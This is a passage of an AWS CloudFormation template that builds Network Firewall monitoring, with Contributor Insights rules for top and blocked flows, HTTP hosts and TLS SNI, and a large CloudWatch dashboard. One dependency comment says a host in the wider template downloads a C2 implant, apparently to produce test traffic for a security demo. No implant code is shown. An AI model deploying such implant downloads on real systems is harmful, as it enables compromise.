            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopTCPFlowsByBytesRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top UDP Flows
  TopUDPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.proto",
              "In": [
                "UDP"
            ]
            }],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopUDPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top UDP Flows by Packets
  TopUDPFlowsByPacketsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.proto",
                "In": [
                  "UDP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ],
            "ValueOf": "$.event.netflow.pkts"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopUDPFlowsByPacketsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top UDP Flows by Bytes
  TopUDPFlowsByBytesRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Sum",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.proto",
                "In": [
                  "UDP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ],
            "ValueOf": "$.event.netflow.bytes"
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallFlowLogGroupName}"
          ]
        }
      RuleName: !Sub TopUDPFlowsByBytesRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top ICMP Flows
  TopICMPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.proto",
              "In": [
              "ICMP"
            ]
            }],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallFlowLogGroupName}"
            ]
        }
      RuleName: !Sub TopICMPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top Blocked Remote Access Ports
  TopBlockedRemoteAccessPortsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.alert.action",
                "In": [
                  "blocked"
                ]
              },
              {
                "Match": "$.event.dest_port",
                "In": [
                  "22",
                  "23",
                  "3389"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallAlertLogGroupName}"
          ]
        }
      RuleName: !Sub TopBlockedRemoteAccessPortsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState   

  # Contributor Insights Rule - Top Blocked TCP Flows
  TopBlockedTCPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.alert.action",
                "In": [
                  "blocked"
                ]
              },
              {
                "Match": "$.event.proto",
                "In": [
                  "TCP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallAlertLogGroupName}"
          ]
        }
      RuleName: !Sub TopBlockedTCPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState 

  # Contributor Insights Rule - Top Blocked UDP Flows
  TopBlockedUDPFlowsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [
              {
                "Match": "$.event.alert.action",
                "In": [
                  "blocked"
                ]
              },
              {
                "Match": "$.event.proto",
                "In": [
                  "UDP"
                ]
              }
            ],
            "Keys": [
              "$.event.src_ip",
              "$.event.dest_ip",
              "$.event.dest_port"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallAlertLogGroupName}"
          ]
        }
      RuleName: !Sub TopBlockedUDPFlowsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top HTTP Host Header
  TopHTTPHostHeaderRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.alert.action",
              "NotIn": [
              "blocked"
            ]
            }],
            "Keys": [
              "$.event.http.hostname"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallAlertLogGroupName}"
            ]
        }
      RuleName: !Sub TopHTTPHostHeaderRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState 

  # Contributor Insights Rule - Top Blocked HTTP Host Header
  TopBlockedHTTPHostHeaderRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.alert.action",
              "In": [
              "blocked"
            ]
            }],
            "Keys": [
              "$.event.http.hostname"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallAlertLogGroupName}"
            ]
        }
      RuleName: !Sub TopBlockedHTTPHostHeaderRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top HTTP URI Paths
  TopHTTPURIPathsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.http.url"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallAlertLogGroupName}"
          ]
        }
      RuleName: !Sub TopHTTPURIPathsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top HTTP User-Agents
  TopHTTPUserAgentsRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
          "AggregateOn": "Count",
          "Contribution": {
            "Filters": [],
            "Keys": [
              "$.event.http.http_user_agent"
            ]
          },
          "LogFormat": "JSON",
          "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
          },
          "LogGroupNames": [
            "${FirewallAlertLogGroupName}"
          ]
        }
      RuleName: !Sub TopHTTPUserAgentsRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

  # Contributor Insights Rule - Top TLS SNI
  TopTLSSNIRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.alert.action",
              "NotIn": [
              "blocked"
            ]
            }],
            "Keys": [
              "$.event.tls.sni"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallAlertLogGroupName}"
            ]
        }
      RuleName: !Sub TopTLSSNIRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState   

  # Contributor Insights Rule - Top Blocked TLS SNI
  TopBlockedTLSSNIRule:
    Type: AWS::CloudWatch::InsightRule
    Properties:
      RuleBody: !Sub |
        {
            "AggregateOn": "Count",
            "Contribution": {
            "Filters": [{
              "Match": "$.event.alert.action",
              "In": [
              "blocked"
            ]
            }],
            "Keys": [
              "$.event.tls.sni"
            ]
            },
            "LogFormat": "JSON",
            "Schema": {
            "Name": "CloudWatchLogRule",
            "Version": 1
            },
            "LogGroupNames":[
              "${FirewallAlertLogGroupName}"
            ]
        }
      RuleName: !Sub TopBlockedTLSSNIRule-${FirewallName}
      RuleState: !Ref ContributorInsightsRuleState

    
  ##### CloudWatch Dashboard #####

  # CloudWatch Dashboard Body with Metrics, Contribtor Insights rules, and Logs Insights Queries
  FirewallDashboard:
    Type: AWS::CloudWatch::Dashboard
    DependsOn:
      - TopBlockedTLSSNIRule
      - EgressInstance                     # Dependency on the public traffic host to download C2 Implant
      - NatGw1                             # Ensure NAT gateway is created and available
      - EgressGatewayAttachment            # Ensure the internet gateway is attached to the VPC
      - PrivateRtb1DefaultRoute            # Ensure the private route table has the default route through the NAT
      - PublicRtb1FwReturn1                 # Ensure return route for firewall to the public route table
      - EgressVPCFirewall                  # Ensure the firewall is created
      - EgressVPCFirewallLog               # Ensure firewall logging is configured
      - FirewallSubnet1                    # Ensure the firewall subnet is ready
      - FirewallVpceIds                    # Ensure firewall VPC endpoints are available
    Properties:
      DashboardBody: !Sub
        - |
          {
              "widgets": [
                  {
                      "height": 2,
                      "width": 24,
                      "y": 0,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Overview\n[button:primary:Firewall Console](https://${AWS::Region}.console.aws.amazon.com/vpc/home?region=${AWS::Region}#NetworkFirewallDetails:arn=arn_aws_network-firewall_${AWS::Region}_${AWS::AccountId}_firewall~${FirewallName}) [button:Troubleshooting](https://docs.aws.amazon.com/network-firewall/latest/developerguide/troubleshooting.html) [button:re&#58;Post](https://repost.aws/search/content?globalSearch=network%20firewall)",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 2,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Firewall Endpoints",
                          "background": "transparent"
                      }
                  },        
                  {
                      "height": 7,
                      "width": 6,
                      "y": 3,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH(' Namespace=\"AWS/PrivateLinkEndpoints\" ${subnet_query_string}', 'Sum', 300)", "label": "${!PROP('Dim.VPC Endpoint Id')}  ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "view": "timeSeries",
                          "stacked": false,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 300,
                          "title": "Firewall Endpoint ENI (GWLBe/VPCe) Metrics",
                          "legend": {
                              "position": "bottom"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 3,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "((m1/300)/.008)", "label": "${!PROP('Dim.VPC Endpoint Id')}", "id": "e1", "period": 300, "stat": "Sum", "region": "${AWS::Region}" } ],
                              [ { "expression": "SEARCH('Namespace=\"AWS/PrivateLinkEndpoints\" ${subnet_query_string} MetricName=\"BytesProcessed\"', 'Sum', 300)", "label": "Expression1", "id": "m1", "region": "${AWS::Region}", "visible": false } ]
                          ],
                          "view": "gauge",
                          "stacked": true,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 60,
                          "title": "Per Endpoint Utilization Gbps",
                          "yAxis": {
                              "left": {
                                  "min": 0,
                                  "max": 100000000000
                              }
                          },
                          "setPeriodToTimeRange": false,
                          "sparkline": true,
                          "trend": true
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 3,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/PrivateLinkEndpoints\" ${subnet_query_string} MetricName=\"ActiveConnections\"', 'Sum', 300)", "label": "${!PROP('Dim.VPC Endpoint Id')}  ${!PROP('MetricName')}", "id": "m1", "region": "${AWS::Region}", "visible": true } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "period": 300,
                          "stat": "Sum",
                          "title": "ActiveConnections"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 3,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/PrivateLinkEndpoints\" ${subnet_query_string} MetricName=\"BytesProcessed\"', 'Sum', 300)", "label": "${!PROP('Dim.VPC Endpoint Id')}  ${!PROP('MetricName')}", "id": "m2", "region": "${AWS::Region}", "visible": true } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "period": 300,
                          "stat": "Sum",
                          "title": "BytesProcessed"
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 10,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Firewall Engines",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 11,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "## Stateless",
                          "background": "transparent"
                      }
                  },        
                  {
                      "height": 7,
                      "width": 6,
                      "y": 12,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateless\"', 'Sum')", "label": "", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "view": "timeSeries",
                          "stacked": false,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 300,
                          "title": "Stateless Engine Metrics",
                          "legend": {
                              "position": "bottom"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 12,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateless\" MetricName=\"PassedPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "title": "Stateless Passed Packets",
                          "period": 300,
                          "stat": "Sum"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 12,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateless\" MetricName=\"DroppedPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "title": "Stateless Dropped Packets - Rule Action",
                          "period": 300,
                          "stat": "Sum"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 12,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateless\" MetricName=Other OR Invalid', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "title": "Stateless Dropped Packets - Other",
                          "period": 300,
                          "stat": "Sum"
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 19,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "## Stateful\n",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 20,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateful\"', 'Sum')", "label": "", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "view": "timeSeries",
                          "stacked": false,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 300,
                          "title": "Stateful Engine Metrics"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 20,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateful\" MetricName=\"PassedPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "period": 300,
                          "stat": "Sum",
                          "title": "Stateful Passed Packets"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 20,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateful\" MetricName=\"DroppedPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "period": 300,
                          "stat": "Sum",
                          "title": "Stateful Dropped Packets"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 20,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" Engine=\"Stateful\" MetricName=\"RejectedPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "sparkline": true,
                          "view": "singleValue",
                          "region": "${AWS::Region}",
                          "period": 300,
                          "stat": "Sum",
                          "title": "Stateful Rejected Packets"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 27,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" MetricName=TLS', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "view": "timeSeries",
                          "stacked": false,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 300,
                          "title": "TLS Inspection"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 27,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "metrics": [
                              [ { "expression": "SEARCH('Namespace=\"AWS/NetworkFirewall\" FirewallName=\"${FirewallName}\" MetricName=\"StreamExceptionPolicyPackets\"', 'Sum', 300)", "label": "${!PROP('Dim.AvailabilityZone')} ${!PROP('MetricName')}", "id": "e1", "region": "${AWS::Region}" } ]
                          ],
                          "view": "timeSeries",
                          "stacked": false,
                          "region": "${AWS::Region}",
                          "stat": "Sum",
                          "period": 300,
                          "title": "Stream Exception Policy Packets"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 27,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopLongLivedTCPFlowsRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top Long-Lived TCP Flows - Age > 350s",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 27,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopTCPSYNWithoutSYNACKRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top TCP Flows - SYN Without SYN-ACK",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 34,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Top Talkers\n",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 35,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Source IP by Packets",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopSourceIPByPacketsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 35,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Source IP by Bytes",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopSourceIPByBytesRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 35,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Destination IP by Packets",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopDestinationIPByPacketsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 35,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Destination IP by Bytes",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopDestinationIPByBytesRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 12,
                      "y": 42,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Source and Destination IP by Packets",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopSourceAndDestinationIPByPacketsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 12,
                      "y": 42,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopSourceAndDestinationIPByBytesRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top Source and Destination IP by Bytes",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 1,
                      "width": 24,
                      "y": 49,
                      "x": 0,
                      "type": "text",
                      "properties": {
                          "markdown": "# Top Protocols",
                          "background": "transparent"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 50,
                      "x": 0,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallFlowLogGroupName}' | stats count() as proto by event.proto\n| sort proto desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "title": "Top Protocols",
                          "view": "pie"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 50,
                      "x": 6,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallFlowLogGroupName}' | stats count() as app_proto by event.app_proto\n| sort app_proto desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "view": "pie",
                          "title": "Top Application Layer Protocols Detected"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 50,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Source Port",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopSourcePortsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 50,
                      "x": 18,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top Destination Port",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopDestinationPortsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 57,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopTCPFlowsRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top TCP Flows",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 57,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopTCPFlowsByPacketsRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top TCP Flows by Packets",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 57,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopTCPFlowsByBytesRule.RuleName}"
                          },
                          "stacked": false,
                          "view": "timeSeries",
                          "yAxis": {
                              "left": {
                                  "showUnits": false
                              },
                              "right": {
                                  "showUnits": false
                              }
                          },
                          "region": "${AWS::Region}",
                          "title": "Top TCP Flows by Bytes",
                          "legend": {
                              "position": "right"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 57,
                      "x": 18,
                      "type": "log",
                      "properties": {
                          "query": "SOURCE '${FirewallFlowLogGroupName}' | stats count() as tcp_flags by event.tcp.tcp_flags\n| sort tcp_flags desc\n| limit 10",
                          "region": "${AWS::Region}",
                          "title": "Top TCP Flags",
                          "view": "pie"
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 64,
                      "x": 0,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top UDP Flows",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopUDPFlowsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 64,
                      "x": 6,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top UDP Flows by Packets",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
                              "ruleName": "${TopUDPFlowsByPacketsRule.RuleName}"
                          }
                      }
                  },
                  {
                      "height": 7,
                      "width": 6,
                      "y": 64,
                      "x": 12,
                      "type": "metric",
                      "properties": {
                          "period": 60,
                          "region": "${AWS::Region}",
                          "stacked": false,
                          "timezone": "local",
                          "title": "Top UDP Flows by Bytes",
                          "view": "timeSeries",
                          "legend": {
                              "position": "right"
                          },
                          "insightRule": {
                              "maxContributorCount": 10,
                              "orderBy": "Sum",
